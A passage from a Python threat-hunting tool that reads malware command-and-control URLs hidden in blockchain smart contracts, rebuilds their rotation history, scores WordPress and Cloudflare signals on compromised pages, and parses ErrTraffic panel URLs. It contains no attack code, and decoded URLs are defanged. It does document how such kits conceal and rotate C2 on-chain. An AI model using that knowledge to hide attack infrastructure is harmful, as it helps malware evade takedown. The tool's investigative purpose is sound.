        return "".join(chr(b) for b in raw if b > 0).strip() or None
    try: return raw.decode("utf-8").rstrip("\x00").strip() or None
    except Exception: return None


def _decode_abi_address(hex_data: str | None) -> str | None:
    """Decode an ABI-encoded `address` return (a left-padded 32-byte word →
    the low 20 bytes). Returns a checksum-lowercased 0x… address, or None for
    the zero address / malformed data. Used to read admin()/owner() getters."""
    if not hex_data: return None
    h = hex_data[2:] if hex_data.startswith("0x") else hex_data
    if len(h) < 40: return None
    word = h[:64] if len(h) >= 64 else h
    a = word[-40:]
    if not re.fullmatch(r'[0-9a-fA-F]{40}', a) or int(a, 16) == 0: return None
    return "0x" + a.lower()


# Process-lifetime cache for --resolve in batch mode: avoid hitting the same
# (contract, selector) tuple repeatedly when 1000s of compromised pages all
# point at the same on-chain C2 holder.
_RESOLVE_CACHE: dict[tuple, dict] = {}
_RESOLVE_CACHE_LOCK = threading.Lock()


def resolve_etherhiding(eh: dict, override_rpc: str | None = None,
                        timeout: int = DEFAULT_RPC_TIMEOUT) -> dict:
    contracts = eh.get("contract_addresses") or []
    selector  = eh.get("method_selector") or "0x38bcdc1c"
    if not contracts: return {"ok": False, "error": "no contract address in classification"}
    cache_key = (tuple(c.lower() for c in contracts), selector.lower(), override_rpc)
    with _RESOLVE_CACHE_LOCK:
        cached = _RESOLVE_CACHE.get(cache_key)
    if cached:
        # mark cache hit so report shows we didn't hammer the RPC repeatedly
        return {**cached, "from_cache": True}
    rpcs = [override_rpc] if override_rpc else list(eh.get("rpc_pool") or [])
    if not rpcs: rpcs = DEFAULT_RPC_POOL.get(eh.get("chain"), [])
    if not rpcs: return {"ok": False, "error": "no RPC pool and no chain fallback known"}
    tried, last_err = [], None
    for rpc in rpcs:
        for contract in contracts:
            t0 = datetime.datetime.now(datetime.timezone.utc)
            try: raw = eth_call(rpc, contract, selector, timeout=timeout)
            except (urllib.error.URLError, ConnectionError, TimeoutError,
                    RuntimeError, ValueError) as e:
                tried.append({"rpc": rpc, "contract": contract, "error": str(e)[:200]})
                last_err = str(e); continue
            decoded = decode_abi_string(raw, lax_drop_nulls=True)
            result = {
                "ok": True, "rpc_used": rpc, "contract": contract, "selector": selector,
                "raw_response": raw[:512] + ("…" if len(raw) > 512 else ""),
                "raw_response_len": len(raw),
                "decoded_url": decoded,
                "decoded_url_defanged": _defang(decoded) if decoded else None,
                "decoded_at": t0.isoformat(timespec="seconds").replace("+00:00", "Z"),
                "attempts": tried + [{"rpc": rpc, "contract": contract, "ok": True}],
                "from_cache": False,
            }
            with _RESOLVE_CACHE_LOCK:
                _RESOLVE_CACHE[cache_key] = result
            return result
    return {"ok": False, "error": f"all {len(rpcs)} RPCs failed; last: {last_err}",
            "attempts": tried}


# ============================================================================
# NEW: Contract investigation mode
# ============================================================================
# A contract's dispatch table looks like:
#   PUSH4 <4-byte selector>  EQ  PUSH2 <jumpdest>  JUMPI
# Opcodes:  63=PUSH4   14=EQ   61=PUSH2   57=JUMPI
# So the pattern is:  63 <8 hex> 14 (optional small ops, often 61 then JUMPI later)
_BYTECODE_SELECTOR_RE = re.compile(r'63([0-9a-fA-F]{8})14', re.I)


def extract_selectors_from_bytecode(bytecode_hex: str) -> list[str]:
    """Find all 4-byte function selectors hardcoded in the contract's dispatch
    table. Reliable for Solidity-compiled contracts using the standard
    PUSH4-EQ pattern."""
    if not bytecode_hex: return []
    if bytecode_hex.startswith("0x"): bytecode_hex = bytecode_hex[2:]
    seen = []
    for m in _BYTECODE_SELECTOR_RE.finditer(bytecode_hex):
        sel = "0x" + m.group(1).lower()
        if sel not in seen: seen.append(sel)
    return seen


def race_rpc(rpcs: list[str], method: str, params: list,
             timeout: int = DEFAULT_RPC_TIMEOUT) -> tuple[Any, str | None]:
    """Try each RPC in order until one succeeds. Returns (result, rpc_used) or (None, None)."""
    for r in rpcs:
        try: return rpc_call(r, method, params, timeout=timeout), r
        except Exception: continue
    return None, None


def _decode_param_string_from_input(inp: str) -> str | None:
    """Decode a transaction input's ABI string parameter (after 4-byte selector)."""
    if not inp or len(inp) <= 10 + 128: return None
    try:
        length = int(inp[10+64:10+128], 16)
        if 0 < length <= 8192 and len(inp) >= 10 + 128 + length*2:
            return bytes.fromhex(inp[10+128:10+128+length*2]) \
                .decode("utf-8", errors="replace").rstrip("\x00").strip()
    except Exception: pass
    return None


def _fetch_tx_history_etherscan(addr: str, chain: str, max_history: int,
                                progress_fh=None) -> list[dict] | None:
    """Fast path: Etherscan V1/V2 multichain endpoint. With a key set in
    POLYGONSCAN_API_KEY / BSCSCAN_API_KEY / ETHERSCAN_API_KEY env vars, returns
    the complete history. Without a key, falls back to keyless attempts (which
    mostly fail in 2026). Returns None if no endpoint worked."""
    chain_id = {"polygon": 137, "bsc": 56, "bsc-testnet": 97, "ethereum": 1}.get(chain)
    if not chain_id: return None
    key = (os.environ.get("POLYGONSCAN_API_KEY") if chain == "polygon"
           else os.environ.get("BSCSCAN_API_KEY") if chain in ("bsc","bsc-testnet")
           else os.environ.get("ETHERSCAN_API_KEY"))
    etherscan_key = os.environ.get("ETHERSCAN_API_KEY") or key
    # V2 multichain (the canonical endpoint as of 2026)
    urls = []
    if etherscan_key:
        urls.append(f"https://api.etherscan.io/v2/api?chainid={chain_id}"
                    f"&module=account&action=txlist&address={addr}"
                    f"&page=1&offset={max_history}&sort=desc&apikey={etherscan_key}")
    # legacy V1 (still works sometimes, with or without key)
    if chain == "polygon":
        urls.append(f"https://api.polygonscan.com/api?module=account&action=txlist"
                    f"&address={addr}&page=1&offset={max_history}&sort=desc"
                    + (f"&apikey={key}" if key else ""))
    if chain in ("bsc","bsc-testnet"):
        urls.append(f"https://api.bscscan.com/api?module=account&action=txlist"
                    f"&address={addr}&page=1&offset={max_history}&sort=desc"
                    + (f"&apikey={key}" if key else ""))
    # V2 multichain (no key) — usually 'Missing API Key', but try
    urls.append(f"https://api.etherscan.io/v2/api?chainid={chain_id}"
                f"&module=account&action=txlist&address={addr}"
                f"&page=1&offset={max_history}&sort=desc")
    for url in urls:
        if not url: continue
        try:
            req = urllib.request.Request(url, headers={"User-Agent": _BROWSER_UA})
            with urllib.request.urlopen(req, timeout=15) as r:
                d = json.loads(r.read())
        except Exception as e:
            if progress_fh: print(f"  [etherscan] {url[:60]}... -> {e}", file=progress_fh)
            continue
        if d.get("status") != "1":
            if progress_fh: print(f"  [etherscan] {url[:60]}... -> {d.get('message','?')}: "
                                  f"{str(d.get('result',''))[:80]}", file=progress_fh)
            continue
        # parse v1 result format
        history = []
        for t in d.get("result", []):
            sel = (t.get("input") or "0x")[:10].lower()
            meta = lookup_selector(sel) or {}
            decoded_param = (_decode_param_string_from_input(t.get("input", ""))
                             if meta.get("param") == "string" else None)
            history.append({
                "block_number": int(t["blockNumber"]),
                "block_time":   datetime.datetime.fromtimestamp(int(t["timeStamp"]),
                                                                 datetime.timezone.utc)
                                 .isoformat(timespec="seconds").replace("+00:00", "Z"),
                "tx_hash":      t["hash"],
                "from":         t["from"],
                "from_attribution": (lookup_actor(t["from"]) or {}).get("name"),
                "selector":     sel,
                "function":     meta.get("signature", "?"),
                "decoded_param": decoded_param,
                "decoded_param_defanged": _defang(decoded_param) if decoded_param else None,
            })
        if progress_fh:
            print(f"  [etherscan] {url[:60]}... -> {len(history)} txs", file=progress_fh)
        return history
    return None


def _decode_two_string_data(hex_data: str) -> tuple[str | None, str | None]:
    """Decode an ABI-encoded (string, string) event data field. Returns (s1, s2)
    or (None, None) if it doesn't look right."""
    if not hex_data: return (None, None)
    if hex_data.startswith("0x"): hex_data = hex_data[2:]
    if len(hex_data) < 256: return (None, None)
    try:
        off1 = int(hex_data[0:64], 16)
        off2 = int(hex_data[64:128], 16)
    except ValueError: return (None, None)
    def _read_str(byte_off):
        pos = byte_off * 2
        if pos + 64 > len(hex_data): return None
        try: length = int(hex_data[pos:pos+64], 16)
        except ValueError: return None
        if length == 0 or length > 4096: return None
        h = hex_data[pos+64:pos+64+length*2]
        if len(h) < length * 2: return None
        try: return bytes.fromhex(h).decode("utf-8", "replace").rstrip("\x00").strip()
        except Exception: return None
    return (_read_str(off1), _read_str(off2))


def _fetch_tx_history_getlogs(addr: str, rpcs: list[str], max_history: int,
                              max_block_range: int, timeout: int,
                              chunk_size: int = 10_000,
                              progress_fh=None) -> tuple[list[dict] | None, int]:
    """Fast path #2: use eth_getLogs to pull every event the contract emitted in
    the recent <max_block_range> blocks. Each event = one rotation. Adaptively
    halves chunk_size on rate-limit / 400 errors. Returns (history, blocks_covered)
    or (None, 0) if the contract doesn't emit logs."""
    try:
        latest_hex, _ = race_rpc(rpcs, "eth_blockNumber", [], timeout=timeout)
        latest = int(latest_hex, 16)
    except Exception as e:
        if progress_fh: print(f"  [getlogs] eth_blockNumber failed: {e}", file=progress_fh)
        return None, 0
    addr_lc = addr.lower()
    history: list[dict] = []
    block_ts_cache: dict[int, int] = {}     # blockNumber -> unix ts
    to_blk = latest
    floor_blk = max(0, latest - max_block_range)
    covered = 0
    cur_chunk = chunk_size
    saw_any_response = False
    pruned_at = None  # track when public RPC archive horizon is hit
    consecutive_empty = 0
    MAX_CONSECUTIVE_EMPTY = 8     # stop after 8 empty windows (~80k blocks of nothing)
    while to_blk > floor_blk and len(history) < max_history:
        from_blk = max(floor_blk, to_blk - cur_chunk)
        # try each RPC until one accepts the range
        logs = None
        chosen_rpc = None
        pruned_this_round = False
        for rpc in rpcs:
            try:
                req = urllib.request.Request(rpc, data=json.dumps({
                    "jsonrpc":"2.0","id":1,"method":"eth_getLogs",
                    "params":[{"address": addr_lc, "fromBlock": hex(from_blk),
                                "toBlock": hex(to_blk)}],
                }).encode(), headers={"Content-Type":"application/json",
                                       "User-Agent": _BROWSER_UA}, method="POST")
                with urllib.request.urlopen(req, timeout=timeout) as r:
                    d = json.loads(r.read())
                if "error" in d:
                    err = d["error"].get("message","getLogs error")[:200]
                    if "pruned" in err.lower() or "history" in err.lower():
                        pruned_this_round = True
                    raise RuntimeError(err[:100])
                logs = d.get("result") or []
                chosen_rpc = rpc
                saw_any_response = True
                break
            except Exception as e:
                msg = str(e)[:120]
                if "pruned" in msg.lower() or "history has been pruned" in msg.lower():
                    pruned_this_round = True
                if progress_fh and "Bad Request" not in msg:
                    print(f"  [getlogs] {rpc[:40]}... ({from_blk}-{to_blk}): {msg}",
                          file=progress_fh)
                continue
        if pruned_this_round and logs is None:
            pruned_at = from_blk
            if progress_fh:
                print(f"  [getlogs] hit public-RPC archive horizon at block ~{from_blk} "
                      f"(history pruned). Stopping. For deeper history, set "
                      f"POLYGONSCAN_API_KEY or use an archive RPC via --rpc-url.",
                      file=progress_fh)
            break
        if logs is None:
            # halve chunk and retry the same window
            if cur_chunk >= 200:
                cur_chunk //= 2
                if progress_fh: print(f"  [getlogs] reducing chunk to {cur_chunk}",
                                      file=progress_fh)
                continue
            else:
                break  # give up on this range
        # process the logs we got
        # gather block numbers we need timestamps for
        need_ts_blocks = list({int(l["blockNumber"], 16) for l in logs
                                if int(l["blockNumber"], 16) not in block_ts_cache})
        if need_ts_blocks:
            # batch-fetch block timestamps (eth_getBlockByNumber w/ tx flag false)
            for batch_idx in range(0, len(need_ts_blocks), 50):
                batch_blocks = need_ts_blocks[batch_idx:batch_idx+50]
                batch_req = [{"jsonrpc":"2.0","id":i,"method":"eth_getBlockByNumber",
                              "params":[hex(b), False]} for i, b in enumerate(batch_blocks)]
                resp = _rpc_batch(chosen_rpc, batch_req, timeout) or []
                for b, blk in zip(batch_blocks, resp):
                    if blk and "timestamp" in blk:
                        block_ts_cache[b] = int(blk["timestamp"], 16)
        for log in logs:
            blk_num = int(log["blockNumber"], 16)
            ts = block_ts_cache.get(blk_num, 0)
            old_url, new_url = _decode_two_string_data(log.get("data", "0x"))
            # If we couldn't decode 2 strings, try as a single string (different event shape)
            if not (old_url or new_url):
                single = decode_abi_string(log.get("data", "0x"), lax_drop_nulls=True)
                if single: new_url = single
            history.append({
                "block_number": blk_num,
                "block_time":   datetime.datetime.fromtimestamp(ts, datetime.timezone.utc)
                                 .isoformat(timespec="seconds").replace("+00:00", "Z") if ts else None,
                "tx_hash":      log.get("transactionHash"),
                "from":         None,           # not in log; would need separate eth_getTransactionByHash
                "from_attribution": None,
                "selector":     None,
                "function":     "(event)",
                "event_topic0": (log.get("topics") or [None])[0],
                "decoded_param": new_url,
                "decoded_param_defanged": _defang(new_url) if new_url else None,
                "previous_value": old_url,
                "previous_value_defanged": _defang(old_url) if old_url else None,
            })
        covered += (to_blk - from_blk)
        if logs:
            consecutive_empty = 0
        else:
            consecutive_empty += 1
        if progress_fh:
            print(f"  [getlogs] blocks [{from_blk}..{to_blk}] ({to_blk-from_blk}) -> "
                  f"{len(logs)} logs (total: {len(history)})", file=progress_fh)
        if consecutive_empty >= MAX_CONSECUTIVE_EMPTY and history:
            if progress_fh:
                print(f"  [getlogs] {MAX_CONSECUTIVE_EMPTY} consecutive empty windows; "
                      f"likely past archive horizon or rotation gap. Stopping.",
                      file=progress_fh)
            break
        to_blk = from_blk
    if not saw_any_response:
        return None, 0
    if not history:
        return None, covered   # responded but contract emits no events — fallback to block scan
    history.sort(key=lambda h: -h["block_number"])
    return history[:max_history], covered


def _rpc_batch(rpc_url: str, requests: list[dict], timeout: int) -> list[dict] | None:
    """Send a JSON-RPC batch. Returns list of result dicts (None for failed individual calls)."""
    try:
        req = urllib.request.Request(rpc_url, data=json.dumps(requests).encode(),
            headers={"Content-Type":"application/json","User-Agent": _BROWSER_UA}, method="POST")
        with urllib.request.urlopen(req, timeout=timeout) as r:
            resp = json.loads(r.read())
    except Exception:
        return None
    if not isinstance(resp, list):
        return None
    by_id = {r.get("id"): r for r in resp}
    return [by_id.get(req["id"], {}).get("result") for req in requests]


def _fetch_block_batch(rpcs: list[str], block_nums: list[int], timeout: int
                       ) -> list[dict | None]:
    """Fetch N blocks in one JSON-RPC batch; race across RPC pool on failure."""
    batch = [{"jsonrpc":"2.0", "id": i, "method": "eth_getBlockByNumber",
              "params": [hex(b), True]} for i, b in enumerate(block_nums)]
    for rpc in rpcs:
        result = _rpc_batch(rpc, batch, timeout)
        if result is not None:
            return result
    return [None] * len(block_nums)


def _fetch_tx_history_rpc_parallel(addr: str, rpcs: list[str], max_history: int,
                                   max_blocks: int, timeout: int, workers: int,
                                   batch_size: int = 50,
                                   progress_fh=None) -> tuple[list[dict], int]:
    """Fallback: parallel BATCHED block-scan via JSON-RPC. Each batch fetches
    `batch_size` blocks in a single HTTP round-trip; `workers` batches run
    concurrently across the RPC pool. Default config: 8 workers x 50-block
    batches = 400 blocks per round-trip ≈ 1000+ blocks/sec on healthy RPCs."""
    try:
        latest_hex, _ = race_rpc(rpcs, "eth_blockNumber", [], timeout=timeout)
        latest = int(latest_hex, 16)
    except Exception as e:
        if progress_fh: print(f"  [rpc-scan] eth_blockNumber failed: {e}", file=progress_fh)
        return [], 0

    history: list[dict] = []
    scanned = 0
    cur = latest
    addr_lc = addr.lower()
    started = datetime.datetime.now(datetime.timezone.utc)

    def process_batch(block_nums: list[int]) -> list[dict]:
        blocks = _fetch_block_batch(rpcs, block_nums, timeout)
        local = []
        for b in blocks:
            if not b: continue
            ts = int(b.get("timestamp", "0x0"), 16)
            for tx in b.get("transactions", []):
                if (tx.get("to") or "").lower() != addr_lc: continue
                inp = tx.get("input") or "0x"
                sel = inp[:10].lower() if len(inp) >= 10 else ""
                meta = lookup_selector(sel) or {}
                decoded_param = (_decode_param_string_from_input(inp)
                                 if meta.get("param") == "string" else None)
                local.append({
                    "block_number": int(tx["blockNumber"], 16),
                    "block_time":   datetime.datetime.fromtimestamp(ts, datetime.timezone.utc)
                                     .isoformat(timespec="seconds").replace("+00:00", "Z"),
                    "tx_hash":      tx["hash"],
                    "from":         tx["from"],
                    "from_attribution": (lookup_actor(tx["from"]) or {}).get("name"),
                    "selector":     sel,
                    "function":     meta.get("signature", "?"),
                    "decoded_param": decoded_param,
                    "decoded_param_defanged": _defang(decoded_param) if decoded_param else None,
                })
        return local

    with ThreadPoolExecutor(max_workers=workers) as ex:
        in_flight = []
        per_round = batch_size * workers
        while cur > 0 and len(history) < max_history and scanned < max_blocks:
            for _ in range(workers):
                if cur <= 0 or scanned >= max_blocks: break
                end = max(0, cur - batch_size)
                block_nums = list(range(cur, end, -1))
                if not block_nums: break
                in_flight.append(ex.submit(process_batch, block_nums))
                cur = end
                scanned += len(block_nums)
            for fut in as_completed(in_flight):
                history.extend(fut.result())
                if len(history) >= max_history: break
            in_flight = []
            if progress_fh:
                dt = max(0.001, (datetime.datetime.now(datetime.timezone.utc)
                                  - started).total_seconds())
                rate = scanned / dt
                print(f"  [rpc-scan] scanned {scanned:,} blocks "
                      f"({rate:.0f}/s), found {len(history)} txs", file=progress_fh)

    history.sort(key=lambda h: -h["block_number"])
    return history[:max_history], scanned


def investigate_contract(addr: str, chain: str = "polygon",
                         max_history: int = 200,
                         max_blocks_to_scan: int = 250_000,
                         workers: int = 16,
                         rpc_override: str | None = None,
                         timeout: int = DEFAULT_RPC_TIMEOUT,
                         skip_etherscan: bool = False,
                         progress_fh=None) -> dict:
    """Comprehensive contract analysis: current state + bytecode-extracted
    selectors + tx history (Etherscan fast-path with RPC block-scan fallback)."""
    addr = addr.lower()
    if not re.fullmatch(r'0x[0-9a-f]{40}', addr):
        return {"error": f"invalid address {addr!r} (must be 0x + 40 hex)"}
    rpcs = [rpc_override] if rpc_override else DEFAULT_RPC_POOL.get(chain, [])
    if not rpcs:
        return {"error": f"no RPC pool known for chain={chain!r}; pass --rpc-url"}
    started = datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="seconds").replace("+00:00", "Z")
    report: dict = {
        "schema_version": SCHEMA_VERSION, "tool": TOOL_VERSION, "mode": "investigate_contract",
        "address": addr, "chain": chain, "started_at": started,
        "actor_attribution": lookup_actor(addr),
        "bytecode": {}, "current_state": {}, "history": [],
        "history_source": None, "errors": [],
    }

    # 1. Bytecode
    if progress_fh: print(f"[investigate] eth_getCode {addr}", file=progress_fh)
    code, used = race_rpc(rpcs, "eth_getCode", [addr, "latest"], timeout=timeout)
    if code:
        report["bytecode"] = {
            "rpc_used":         used,
            "size_bytes":       (len(code) - 2) // 2,
            "selectors_found":  extract_selectors_from_bytecode(code),
        }
    else:
        report["errors"].append("eth_getCode returned nothing on all RPCs")

    # 2. Current state — call every known getter we find in the bytecode.
    #    Decodes both `string` returns (the C2 URL) AND `address` returns
    #    (admin()/owner() → the operator wallet).
    for sel in report["bytecode"].get("selectors_found", []):
        meta = lookup_selector(sel)
        if not meta or "returns" not in meta: continue
        try:
            raw = eth_call(rpcs[0], addr, sel, timeout=timeout)
            ret = meta["returns"]
            decoded = None
            if ret.startswith("string"):
                decoded = decode_abi_string(raw, lax_drop_nulls=ret == "string_lax")
            elif ret == "address":
                decoded = _decode_abi_address(raw)
            report["current_state"][sel] = {
                "signature": meta["signature"],
                "returns":   ret,
                "raw":       raw[:256] + ("…" if len(raw) > 256 else ""),
                "decoded":   decoded,
                # only URL-style strings get defanged; addresses stay as-is
                "decoded_defanged": (_defang(decoded) if (decoded and ret.startswith("string")) else decoded),
            }
        except Exception as e:
            report["current_state"][sel] = {"signature": meta["signature"], "error": str(e)[:200]}

    # 2b. Convenience top-level extraction of the two highest-value state fields:
    #     the current C2 URL (string getter) and the admin/operator wallet
    #     (address getter), the latter cross-referenced against KNOWN_ACTORS.
    cur = report["current_state"]
    cur_url = None
    for st in cur.values():
        if (st.get("returns") or "").startswith("string") and st.get("decoded"):
            cur_url = st["decoded"]; break
    report["current_url"]          = cur_url
    report["current_url_defanged"] = _defang(cur_url) if cur_url else None
    admin_wallet = None
    for st in cur.values():
        if st.get("returns") == "address" and st.get("decoded"):
            admin_wallet = st["decoded"]; break
    report["admin_wallet"]             = admin_wallet
    report["admin_wallet_attribution"] = lookup_actor(admin_wallet) if admin_wallet else None

    # 3. Transaction history — try in order:
    #    (a) Etherscan-family API  (fastest if key present; usually requires one now)
    #    (b) eth_getLogs            (fast & key-free IF the contract emits events)
    #    (c) Parallel batched block-scan via RPC  (works on any contract; slowest)
    history = None
    if not skip_etherscan:
        if progress_fh: print(f"[investigate] trying Etherscan-family fast path", file=progress_fh)
        history = _fetch_tx_history_etherscan(addr, chain, max_history, progress_fh)
        if history is not None: report["history_source"] = "etherscan-family-api"
    if history is None:
        if progress_fh:
            print(f"[investigate] trying eth_getLogs (event-based; needs contract to emit events)",
                  file=progress_fh)
        history, blocks_covered = _fetch_tx_history_getlogs(
            addr, rpcs, max_history, max_block_range=max_blocks_to_scan,
            timeout=timeout, progress_fh=progress_fh)
        if history is not None:
            report["history_source"] = "eth_getLogs"
            report["blocks_covered"] = blocks_covered
    if history is None:
        if progress_fh:
            print(f"[investigate] fallback: parallel BATCHED RPC block scan "
                  f"({workers} workers, batch=50 blocks, up to {max_blocks_to_scan} blocks)",
                  file=progress_fh)
        history, scanned = _fetch_tx_history_rpc_parallel(
            addr, rpcs, max_history, max_blocks_to_scan, timeout, workers,
            progress_fh=progress_fh)
        report["scanned_blocks"] = scanned
        report["history_source"] = "rpc-parallel-block-scan"
    report["history"] = history or []

    # 4. Cross-reference unique writer wallets against KNOWN_ACTORS
    # (event-sourced history has from=None; only tx-sourced history populates it)
    history = report["history"]
    writers = sorted({h["from"].lower() for h in history if h.get("from")})
    report["writer_wallets"] = []
    for w in writers:
        att = lookup_actor(w)
        report["writer_wallets"].append({
            "address": w, "attribution": att,
            "tx_count": sum(1 for h in history if (h.get("from") or "").lower() == w),
        })

    # 5. Aggregate the rotation timeline (unique decoded URLs in order)
    unique_urls = []
    seen = set()
    for h in history:
        u = h.get("decoded_param")
        if u and u not in seen:
            seen.add(u); unique_urls.append({"url": u, "url_defanged": _defang(u),
                                             "first_set_block": h["block_number"],
                                             "first_set_time":  h["block_time"]})
    report["unique_urls_seen"] = unique_urls

    # 6. One-line summary block — the row a bulk run flattens into CSV.
    report["summary"] = {
        "address":              addr,
        "chain":                chain,
        "actor":                (report.get("actor_attribution") or {}).get("name"),
        "current_url":          report.get("current_url"),
        "current_url_defanged": report.get("current_url_defanged"),
        "admin_wallet":         report.get("admin_wallet"),
        "admin_attribution":    (report.get("admin_wallet_attribution") or {}).get("name"),
        "n_selectors":          len((report.get("bytecode") or {}).get("selectors_found") or []),
        "n_history":            len(history),
        "n_distinct_urls":      len(unique_urls),
        "n_writer_wallets":     len(report.get("writer_wallets") or []),
        "history_source":       report.get("history_source"),
        "first_rotation_time":  (unique_urls[0]["first_set_time"] if unique_urls else None),
        "last_rotation_time":   (unique_urls[-1]["first_set_time"] if unique_urls else None),
    }
    return report


# ============================================================================
# ANSI colors  (auto-disabled when stdout is not a TTY)
# ============================================================================
class C:
    RED     = "\x1b[91m"
    GREEN   = "\x1b[92m"
    YELLOW  = "\x1b[93m"
    BLUE    = "\x1b[94m"
    MAGENTA = "\x1b[95m"
    CYAN    = "\x1b[96m"
    WHITE   = "\x1b[97m"
    GRAY    = "\x1b[90m"
    BOLD    = "\x1b[1m"
    DIM     = "\x1b[2m"
    UNDER   = "\x1b[4m"
    RESET   = "\x1b[0m"
    BG_RED  = "\x1b[41m"
    BG_GREEN = "\x1b[42m"

    @classmethod
    def disable(cls):
        for attr in dir(cls):
            if attr.isupper() and not attr.startswith("_"):
                setattr(cls, attr, "")

# Color auto-enable:
#  - Real TTY on any OS: ON
#  - Git Bash / MinTTY on Windows: ON (sys.stdout.isatty() returns False even
#    though it's a real terminal; detect via $TERM, $MSYSTEM, $WT_SESSION)
#  - JSON/JSONL stdout redirection: OFF (auto via tty check)
#  - Explicit --no-color always wins
def _looks_like_real_terminal() -> bool:
    if sys.stdout.isatty(): return True
    env = os.environ
    if env.get("WT_SESSION") or env.get("TERM_PROGRAM"): return True
    if env.get("MSYSTEM") and env.get("TERM"): return True       # Git Bash / MinTTY
    if env.get("ConEmuANSI") == "ON": return True
    return False

if not _looks_like_real_terminal():
    C.disable()
elif sys.platform == "win32":
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    except Exception: pass


# ============================================================================
# WordPress detection — multi-signal scoring
# ============================================================================
_WP_SIGNALS = [
    # (regex, weight, signal_name)
    (re.compile(r'<meta\s+name=["\']generator["\']\s+content=["\']WordPress\s*([\d.]+)?', re.I), 0.9, "meta_generator"),
    (re.compile(r'/wp-content/(?:themes|plugins|uploads)/', re.I),                              0.5, "wp_content_path"),
    (re.compile(r'/wp-includes/(?:js|css|images)/', re.I),                                       0.4, "wp_includes_path"),
    (re.compile(r'/wp-json/(?:wp/v2/|oembed/)', re.I),                                           0.5, "wp_json_rest"),
    (re.compile(r'\bwp-embed(?:\.min)?\.js', re.I),                                              0.3, "wp_embed_js"),
    (re.compile(r'\bwp-emoji-release(?:\.min)?\.js', re.I),                                      0.3, "wp_emoji"),
    (re.compile(r'\bwpemojiSettings\s*=', re.I),                                                 0.3, "wp_emoji_settings"),
    (re.compile(r'<link[^>]+href=["\'][^"\']*/wp-content/themes/', re.I),                        0.3, "wp_theme_link"),
    (re.compile(r'\bwp_admin\b|wp_ajax_', re.I),                                                 0.2, "wp_admin_kw"),
    (re.compile(r'window\._wpemojiSettings|window\.wp\.', re.I),                                 0.2, "wp_window_obj"),
]


def detect_wordpress(html: str, headers: dict | None = None) -> dict:
    """Return {is_wp, confidence, signals[], version}. Confidence is 0..1 from
    weighted signal sum; is_wp = confidence >= 0.6."""
    if not html:
        return {"is_wp": False, "confidence": 0.0, "signals": [], "version": None}
    signals = []
    score = 0.0
    version = None
    for pattern, weight, name in _WP_SIGNALS:
        m = pattern.search(html)
        if m:
            signals.append(name)
            score += weight
            if name == "meta_generator" and m.lastindex and m.group(1):
                version = m.group(1)
    if headers:
        link = headers.get("Link") or headers.get("link") or ""
        if "/wp-json/" in link:
            signals.append("link_header_wp_json"); score += 0.4
    score = min(1.0, score)
    return {
        "is_wp":      score >= 0.6,
        "confidence": round(score, 2),
        "signals":    signals,
        "version":    version,
    }


# ============================================================================
# Cloudflare detection — multi-signal scoring  (headers + body + DNS)
# ============================================================================
_CF_RAY_RE          = re.compile(r'\bCF-RAY[:=]\s*([\w-]+)', re.I)
_CF_BODY_SIGNAL_RE  = re.compile(r'cloudflare\.com/cdn-cgi/|/cdn-cgi/challenge-platform/'
                                  r'|cf-browser-verification|__cf_bm', re.I)
_CF_CNAME_HINTS     = re.compile(r'\.cloudflare\.net\.?$|\.cdn\.cloudflare\.net\.?$', re.I)


def detect_cloudflare(html: str, headers: dict | None, ip_meta: dict | None = None) -> dict:
    """Multi-source CF detection. Looks at headers first (strongest), then body
    markers, then IP/CNAME hints. Returns {behind_cf, signals[], cf_ray, server}."""
    signals = []
    cf_ray = None
    server = None
    if headers:
        srv = (headers.get("Server") or headers.get("server") or "").strip()
        if srv: server = srv
        if "cloudflare" in srv.lower():
            signals.append(f"server_header:{srv}")
        if headers.get("CF-RAY") or headers.get("cf-ray"):
            cf_ray = headers.get("CF-RAY") or headers.get("cf-ray")
            signals.append(f"cf_ray_header:{cf_ray}")
        for hk in ("CF-Cache-Status","cf-cache-status","CF-Connecting-IP",
                   "Expect-CT","cf-mitigated","cf-apo-via"):
            if hk in headers or hk.lower() in headers:
                signals.append(f"cf_header:{hk}")
    if html and _CF_BODY_SIGNAL_RE.search(html):
        signals.append("cf_body_marker")
    if html and not cf_ray:
        m = _CF_RAY_RE.search(html)
        if m: cf_ray = m.group(1); signals.append(f"cf_ray_inline:{m.group(1)}")
    if ip_meta:
        # CF AS13335 IPs
        asn = (ip_meta.get("asn") or "").lower()
        if "13335" in asn or "cloudflare" in asn:
            signals.append(f"cf_asn:{ip_meta.get('asn')}")
        # CF CIDRs (subset; could be expanded with full official list)
        ip = ip_meta.get("ip") or ""
        if ip.startswith(("104.16.", "104.17.", "104.18.", "104.19.", "104.20.", "104.21.",
                           "172.64.", "172.65.", "172.66.", "172.67.", "172.68.", "172.69.",
                           "162.158.", "131.0.72.", "162.159.", "188.114.")):
            signals.append(f"cf_ip_cidr:{ip}")
        cname = ip_meta.get("cname") or ""
        if _CF_CNAME_HINTS.search(cname):
            signals.append(f"cf_cname:{cname}")
    return {
        "behind_cf": bool(signals),
        "signals":   signals,
        "cf_ray":    cf_ray,
        "server":    server,
    }


# ============================================================================
# ErrTraffic URL parser — pull token/mode/src/os/etc out of any panel URL
# ============================================================================
def parse_errtraffic_panel_url(url: str) -> dict | None:
    """Parse an ErrTraffic API URL into its constituent parts. Returns None if
    URL doesn't look like one. Handles v2, v3 (original), and v3 BW v2 generation
    URL shapes — token, src, and mode params each have multiple known aliases.
    """
    from urllib.parse import urlparse, parse_qs
    try:
        p = urlparse(url)
    except Exception:
        return None
    path = (p.path or "").lower()
    qs = parse_qs(p.query or "", keep_blank_values=True)
    version = detect_errtraffic_version(url)
    if version == "unknown":
        # not an ErrTraffic-shaped URL
        if not ("/api/" in path or "index.php" in path): return None
    qget = lambda k: (qs.get(k, [""])[0] or "").strip()
    action = qget("action") or qget("a")
    # Token aliases — v3 original used `token`; BW v2 renamed to `uj`; some
    # beacons use short-form `t`. Accept any; remember which alias we found.
    token_val, token_alias = None, None
    for alias in ERRTRAFFIC_KIT.get("bw_v2", {}).get("token_param_aliases", ["token","uj","t"]):
        v = qget(alias)
        if v: token_val, token_alias = v, alias; break
    # Source/realm aliases — v3 original `src=` (clickfix/...); BW v2 may
    # collapse to `rlm=` (4 bytes base64-url-safe of a per-deploy ID).
    src_val, src_alias = None, None
    for alias in ERRTRAFFIC_KIT.get("bw_v2", {}).get("src_param_aliases", ["src","rlm"]):
        v = qget(alias)
        if v: src_val, src_alias = v, alias; break
    info = {
        "version":  version,
        "host":     p.hostname,
